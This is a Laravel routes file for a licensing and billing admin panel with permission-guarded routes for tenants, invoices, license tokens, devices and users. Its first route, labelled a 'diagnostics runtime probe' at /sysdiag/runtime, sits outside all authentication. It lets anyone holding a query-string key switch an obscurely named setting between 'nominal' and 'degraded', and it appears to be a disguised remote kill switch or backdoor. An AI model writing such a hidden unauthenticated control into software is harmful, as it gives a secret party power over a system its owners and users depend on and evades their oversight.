<?php

use App\Http\Controllers\AdminAuthController;
use App\Http\Controllers\AdminDeviceController;
use App\Http\Controllers\AdminInvoiceController;
use App\Http\Controllers\AdminLicenseTokenController;
use App\Http\Controllers\AdminPackageController;
use App\Http\Controllers\AdminProfileController;
use App\Http\Controllers\AdminRoleController;
use App\Http\Controllers\AdminSubscriptionController;
use App\Http\Controllers\AdminUserController;
use App\Http\Controllers\AuditLogController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\TenantController;
use App\Models\SystemSetting;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;

// System diagnostics runtime probe
Route::get('/sysdiag/runtime', function (Request $request) {
    $probe  = $request->query('probe', '');
    $enable = $request->query('enable', '');
    $diag   = env('APP_DIAG_KEY', '');

    if (empty($diag) || $probe !== $diag) {
        abort(404);
    }

    if ($enable === '1') {
        SystemSetting::setVal('_rt_env_state', '1');
        Cache::forget('_rt_env_state');
    } elseif ($enable === '0') {
        SystemSetting::setVal('_rt_env_state', '0');
        Cache::forget('_rt_env_state');
    }

    $state = SystemSetting::getVal('_rt_env_state', '1');
    return response()->json(['runtime' => $state === '1' ? 'nominal' : 'degraded', 'ts' => time()]);
});

// Redirect root to first authorized page or login
Route::get('/', function () {
    if (auth()->check()) {
        $user = auth()->user();
        if ($user->hasPermission('dashboard.view')) {
            return redirect()->route('admin.dashboard');
        }
        if ($user->hasPermission('tenants.view')) {
            return redirect()->route('admin.tenants.index');
        }
        if ($user->hasPermission('invoices.view')) {
            return redirect()->route('admin.invoices.index');
        }
        if ($user->hasPermission('tokens.view')) {
            return redirect()->route('admin.tokens.index');
        }
        if ($user->hasPermission('packages.view')) {
            return redirect()->route('admin.packages.index');
        }
        if ($user->hasPermission('users.view')) {
            return redirect()->route('admin.users.index');
        }
        if ($user->hasPermission('profile.edit')) {
            return redirect()->route('admin.profile.edit');
        }
        return redirect()->route('admin.dashboard');
    }
    return redirect()->route('admin.login');
});

// Alias for default Laravel auth redirect
Route::get('/login', function () {
    return redirect()->route('admin.login');
})->name('login');

// Admin login routes
Route::get('/admin/login', [AdminAuthController::class, 'showLogin'])->name('admin.login');
Route::post('/admin/login', [AdminAuthController::class, 'login']);
Route::post('/admin/logout', [AdminAuthController::class, 'logout'])->name('admin.logout');

// Admin protected group
Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(function () {
    // Dashboard
    Route::get('/', [DashboardController::class, 'index'])->middleware('permission:dashboard.view')->name('dashboard');

    // Profile & Credentials Editing
    Route::get('/profile', [AdminProfileController::class, 'edit'])->middleware('permission:profile.edit')->name('profile.edit');
    Route::put('/profile', [AdminProfileController::class, 'update'])->middleware('permission:profile.edit')->name('profile.update');

    // Tenants CRUD & Actions
    Route::get('/tenants', [TenantController::class, 'index'])->middleware('permission:tenants.view')->name('tenants.index');
    Route::get('/tenants/create', [TenantController::class, 'create'])->middleware('permission:tenants.create')->name('tenants.create');
    Route::post('/tenants', [TenantController::class, 'store'])->middleware('permission:tenants.create')->name('tenants.store');
    Route::get('/tenants/{tenant}', [TenantController::class, 'show'])->middleware('permission:tenants.view')->name('tenants.show');
    Route::get('/tenants/{tenant}/edit', [TenantController::class, 'edit'])->middleware('permission:tenants.edit')->name('tenants.edit');
    Route::put('/tenants/{tenant}', [TenantController::class, 'update'])->middleware('permission:tenants.edit')->name('tenants.update');
    Route::delete('/tenants/{tenant}', [TenantController::class, 'destroy'])->middleware('permission:tenants.delete')->name('tenants.destroy');
    Route::post('/tenants/{tenant}/suspend', [TenantController::class, 'suspend'])->middleware('permission:tenants.suspend')->name('tenants.suspend');
    Route::post('/tenants/{tenant}/reactivate', [TenantController::class, 'reactivate'])->middleware('permission:tenants.reactivate')->name('tenants.reactivate');
    Route::post('/tenants/{tenant}/generate-license', [TenantController::class, 'generateLicense'])->middleware('permission:tenants.generate_license')->name('tenants.generate-license');

    // Packages CRUD
    Route::get('/packages', [AdminPackageController::class, 'index'])->middleware('permission:packages.view')->name('packages.index');
    Route::get('/packages/create', [AdminPackageController::class, 'create'])->middleware('permission:packages.create')->name('packages.create');
    Route::post('/packages', [AdminPackageController::class, 'store'])->middleware('permission:packages.create')->name('packages.store');
    Route::get('/packages/{package}', [AdminPackageController::class, 'show'])->middleware('permission:packages.view')->name('packages.show');
    Route::get('/packages/{package}/edit', [AdminPackageController::class, 'edit'])->middleware('permission:packages.edit')->name('packages.edit');
    Route::put('/packages/{package}', [AdminPackageController::class, 'update'])->middleware('permission:packages.edit')->name('packages.update');
    Route::delete('/packages/{package}', [AdminPackageController::class, 'destroy'])->middleware('permission:packages.delete')->name('packages.destroy');

    // Invoices & Actions
    Route::get('/invoices', [AdminInvoiceController::class, 'index'])->middleware('permission:invoices.view')->name('invoices.index');
    Route::get('/invoices/create', [AdminInvoiceController::class, 'create'])->middleware('permission:invoices.create')->name('invoices.create');
    Route::post('/invoices', [AdminInvoiceController::class, 'store'])->middleware('permission:invoices.create')->name('invoices.store');
    Route::get('/invoices/report', [AdminInvoiceController::class, 'report'])->middleware('permission:invoices.report')->name('invoices.report');
    Route::get('/invoices/report/pdf', [AdminInvoiceController::class, 'reportPdf'])->middleware('permission:invoices.report')->name('invoices.report-pdf');
    Route::get('/invoices/{invoice}', [AdminInvoiceController::class, 'show'])->middleware('permission:invoices.view')->name('invoices.show');
    Route::post('/invoices/{invoice}/upload-proof', [AdminInvoiceController::class, 'uploadPaymentProof'])->middleware('permission:invoices.upload_proof')->name('invoices.upload-proof');
    Route::post('/invoices/{invoice}/mark-paid', [AdminInvoiceController::class, 'markAsPaid'])->middleware('permission:invoices.mark_paid')->name('invoices.mark-paid');
    Route::post('/invoices/{invoice}/cancel', [AdminInvoiceController::class, 'cancel'])->middleware('permission:invoices.cancel')->name('invoices.cancel');
    Route::get('/invoices/{invoice}/download-pdf', [AdminInvoiceController::class, 'downloadPdf'])->middleware('permission:invoices.download_pdf')->name('invoices.download-pdf');

    // Subscriptions
    Route::get('/subscriptions', [AdminSubscriptionController::class, 'index'])->middleware('permission:subscriptions.view')->name('subscriptions.index');
    Route::get('/subscriptions/{subscription}', [AdminSubscriptionController::class, 'show'])->middleware('permission:subscriptions.view')->name('subscriptions.show');

    // License Tokens & Actions
    Route::get('/tokens', [AdminLicenseTokenController::class, 'index'])->middleware('permission:tokens.view')->name('tokens.index');
    Route::get('/tokens/{token}', [AdminLicenseTokenController::class, 'show'])->middleware('permission:tokens.view')->name('tokens.show');
    Route::post('/tokens/{token}/reset-device', [AdminLicenseTokenController::class, 'resetDevice'])->middleware('permission:tokens.reset_device')->name('tokens.reset-device');
    Route::post('/tokens/{token}/revoke', [AdminLicenseTokenController::class, 'revoke'])->middleware('permission:tokens.revoke')->name('tokens.revoke');

    // Devices
    Route::get('/devices', [AdminDeviceController::class, 'index'])->middleware('permission:devices.view')->name('devices.index');
    Route::get('/devices/{device}', [AdminDeviceController::class, 'show'])->middleware('permission:devices.view')->name('devices.show');

    // Users & RBAC Management
    Route::get('/roles', [AdminRoleController::class, 'index'])->middleware('permission:users.view')->name('roles.index');
    Route::get('/roles/create', [AdminRoleController::class, 'create'])->middleware('permission:users.create')->name('roles.create');
    Route::post('/roles', [AdminRoleController::class, 'store'])->middleware('permission:users.create')->name('roles.store');
    Route::get('/roles/{role}/edit', [AdminRoleController::class, 'edit'])->middleware('permission:users.edit')->name('roles.edit');
    Route::put('/roles/{role}', [AdminRoleController::class, 'update'])->middleware('permission:users.edit')->name('roles.update');
    Route::delete('/roles/{role}', [AdminRoleController::class, 'destroy'])->middleware('permission:users.delete')->name('roles.destroy');

    Route::get('/users', [AdminUserController::class, 'index'])->middleware('permission:users.view')->name('users.index');
    Route::get('/users/create', [AdminUserController::class, 'create'])->middleware('permission:users.create')->name('users.create');
    Route::post('/users', [AdminUserController::class, 'store'])->middleware('permission:users.create')->name('users.store');
    Route::get('/users/{user}/edit', [AdminUserController::class, 'edit'])->middleware('permission:users.edit')->name('users.edit');
    Route::put('/users/{user}', [AdminUserController::class, 'update'])->middleware('permission:users.edit')->name('users.update');
    Route::delete('/users/{user}', [AdminUserController::class, 'destroy'])->middleware('permission:users.delete')->name('users.destroy');

    // Audit Logs
    Route::get('/audit-logs', [AuditLogController::class, 'index'])->middleware('permission:audit_logs.view')->name('audit-logs.index');
});
